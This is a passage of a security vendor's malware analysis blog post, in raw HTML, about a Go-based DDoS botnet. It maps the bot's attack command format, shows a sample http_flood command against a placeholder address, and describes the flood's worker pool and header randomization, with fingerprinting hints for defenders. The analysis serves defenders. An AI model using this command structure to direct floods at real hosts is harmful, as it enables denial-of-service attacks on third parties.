<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-2cd804015d&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:48:42Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The basic command structure, once finally mapped, is very straight forward. Attack commands always start with &lt;i>API_CONNECTION_ATTACK:&lt;/i> followed by three required fields, the &lt;i>ATTACK_TYPE&lt;/i>, the &lt;i>TARGET&lt;/i>, and the attack &lt;i>DURATION&lt;/i>. For the &lt;i>udp_flood&lt;/i> there is a fourth attack UDP_OPTIONS field, as well; this field is also required when issuing a udp_flood attack because of how command checking occurs, but, oddly, it doesn’t need to be valid at all.&lt;/p>\r\n&lt;h3>Attack type 0: &lt;i>http_flood&lt;/i>&lt;/h3>\r\n&lt;p>The &lt;i>http_flood&lt;/i> command doesn’t appear to utilize additional options parameters like the &lt;i>udp_flood&lt;/i> attack does. As it relies on the native &lt;i>net.http &lt;/i>Go library, most of the configuration and options parsing for this attack comes directly from Go library itself and is controlled via the &lt;i>TARGET &lt;/i>directive. &lt;/p>\r\n&lt;p>In the attack command in Figure 29, we’re issuing an &lt;i>http_flood &lt;/i>(type 0) attack directed at &lt;i>127.127.127.127&lt;/i> on TCP/&lt;i>31337&lt;/i> that will last &lt;i>10&lt;/i> seconds. The path, port, GET parameters, and protocol are all deduced from this target directive. If no port is provided, it will default to TCP/80.&lt;/p>\r\n&#34;}}">
    <p>The basic command structure, once finally mapped, is very straight forward. Attack commands always start with <i>API_CONNECTION_ATTACK:</i> followed by three required fields, the <i>ATTACK_TYPE</i>, the <i>TARGET</i>, and the attack <i>DURATION</i>. For the <i>udp_flood</i> there is a fourth attack UDP_OPTIONS field, as well; this field is also required when issuing a udp_flood attack because of how command checking occurs, but, oddly, it doesn’t need to be valid at all.</p>
<h3>Attack type 0: <i>http_flood</i></h3>
<p>The <i>http_flood</i> command doesn’t appear to utilize additional options parameters like the <i>udp_flood</i> attack does. As it relies on the native <i>net.http </i>Go library, most of the configuration and options parsing for this attack comes directly from Go library itself and is controlled via the <i>TARGET </i>directive. </p>
<p>In the attack command in Figure 29, we’re issuing an <i>http_flood </i>(type 0) attack directed at <i>127.127.127.127</i> on TCP/<i>31337</i> that will last <i>10</i> seconds. The path, port, GET parameters, and protocol are all deduced from this target directive. If no port is provided, it will default to TCP/80.</p>

</div>

    

</div>
<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-aaf5030274&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:35:06Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">API_CONNECTION_ATTACK: 0 http://127.127.127.127:31337/asdf?a=GETA&amp;b=GETB 10 </code>
</pre>
<button data-cmp-hook-prismjs="copy" class="cmp-prismjs__copy">Copy</button>


    

</div>
<div class="text text__pt-none text__pb-none aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-3539ad38fb&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T20:22:33Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Fig. 29: Attack command structure for an http_flood attack&lt;/p>\r\n&#34;}}">
    <p>Fig. 29: Attack command structure for an http_flood attack</p>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-482e3bdcc8&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:36:51Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>As mentioned previously, this binary leans on Go’s own &lt;i>net.http&lt;/i> library to conduct its attacks.The bot creates a worker pool of 512 workers via Goroutines, and each worker creates its own &lt;i>net.http.Request&lt;/i> object. In Figure 30, we can see a bit of how this works from inside an individual worker.&lt;/p>\r\n&#34;}}">
    <p>As mentioned previously, this binary leans on Go’s own <i>net.http</i> library to conduct its attacks.The bot creates a worker pool of 512 workers via Goroutines, and each worker creates its own <i>net.http.Request</i> object. In Figure 30, we can see a bit of how this works from inside an individual worker.</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">
  <div data-cmp-lazy data-title="In Figure 30, we can see a bit of how this works from inside an individual worker.  " class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-eebfcde7d6&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T21:39:43Z&#34;,&#34;dc:title&#34;:&#34;In Figure 30, we can see a bit of how this works from inside an individual worker.&#34;,&#34;xdm:linkURL&#34;:&#34;/site/en/images/blog/2023/figure30.png&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;f53abe9a-c2db-4378-9735-eedce78a3304&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:42:24Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2023/figure30.png&#34;}}}">
    
      <a class="cmp-image__link" href="/site/en/images/blog/2023/figure30.png" target="_blank" rel="nofollow noreferrer" data-cmp-hook-image="link">
        
          <img src="/site/en/images/blog/2023/figure30.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="In Figure 30, we can see a bit of how this works from inside an individual worker.  "/>
        
        
      </a>
    
    

    <span class="cmp-image__title" itemprop="caption">Fig. 30: Screenshot of http_flood configuring headers</span>
    
    
  </div>
</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-fda4decc47&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:38:22Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>First, a new &lt;i>Context &lt;/i>object and a new &lt;i>RequestWithContext&lt;/i> Class are created. This &lt;i>Context&lt;/i> object will be populated with HTTP Headers that will be used during the attack by the &lt;i>RequestWithContext &lt;/i>class. Some of these headers are static, while others are randomized. In Figure 30 you can see the &lt;i>Rand Seed &lt;/i>and &lt;i>Intn&lt;/i> calls; these are used to select a random &lt;i>User-Agent&lt;/i> from a list of 10 static user-agents hard coded within the binary. We’ll talk about which headers to look for below as we analyze the traffic coming out of the malware during an &lt;i>http_flood&lt;/i> attack.&lt;/p>\r\n&#34;}}">
    <p>First, a new <i>Context </i>object and a new <i>RequestWithContext</i> Class are created. This <i>Context</i> object will be populated with HTTP Headers that will be used during the attack by the <i>RequestWithContext </i>class. Some of these headers are static, while others are randomized. In Figure 30 you can see the <i>Rand Seed </i>and <i>Intn</i> calls; these are used to select a random <i>User-Agent</i> from a list of 10 static user-agents hard coded within the binary. We’ll talk about which headers to look for below as we analyze the traffic coming out of the malware during an <i>http_flood</i> attack.</p>

</div>

<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-1cdc4ed2bb&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:40:40Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Let’s touch on some important observations from the HTTP headers captured during simulated attack events. There are several fairly obvious values here for fingerprinting, both in static and randomized fields. Defenders should look at this sample traffic, but for fear of helping the author actually improve attack capabilities, we’re hesitant to highlight exactly why this traffic is likely easy to spot and block for defenders. Without providing too much help to the malware author, we can say that a lot of the payload is fairly static, in size, order, and value. Some fields are randomized — these fields include &lt;i>User-Agent &lt;/i>(from a list of 10 static user-agents), Keep-Alive, and Cookies headers. Defenders should also look closely at the &lt;i>Host&lt;/i> and &lt;i>Referrer&lt;/i> headers in the sample traffic in Figure 31. It’s worth noting that if the attack command does not specify a target port in the target directive, it will default to TCP/80 or TCP/443, and the port will not be included in either header.&lt;/p>\r\n&#34;}}">
    <p>Let’s touch on some important observations from the HTTP headers captured during simulated attack events. There are several fairly obvious values here for fingerprinting, both in static and randomized fields. Defenders should look at this sample traffic, but for fear of helping the author actually improve attack capabilities, we’re hesitant to highlight exactly why this traffic is likely easy to spot and block for defenders. Without providing too much help to the malware author, we can say that a lot of the payload is fairly static, in size, order, and value. Some fields are randomized — these fields include <i>User-Agent </i>(from a list of 10 static user-agents), Keep-Alive, and Cookies headers. Defenders should also look closely at the <i>Host</i> and <i>Referrer</i> headers in the sample traffic in Figure 31. It’s worth noting that if the attack command does not specify a target port in the target directive, it will default to TCP/80 or TCP/443, and the port will not be included in either header.</p>

</div>

    <p>Fig. 32: Attack command structure for a more configured http_flood attack</p>
